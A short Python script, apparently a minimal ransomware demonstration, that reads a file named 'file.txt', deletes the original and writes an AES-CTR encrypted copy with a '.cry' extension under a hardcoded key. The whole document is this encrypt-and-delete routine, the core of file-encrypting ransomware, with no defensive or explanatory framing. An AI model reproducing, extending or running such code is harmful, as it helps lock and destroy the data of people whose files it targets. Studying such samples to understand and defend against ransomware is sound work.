import os
import pyaes

key = b"diocybersecurity"
file_name = "file.txt"
crypt_name = file_name + ".cry"

file = open(file_name, "rb")
file_data = file.read()
file.close()
os.remove(file_name)

crypt_data = pyaes.AESModeOfOperationCTR(key).encrypt(file_data)
crypt_file = open(crypt_name,'wb')
crypt_file.write(crypt_data)
crypt_file.close()
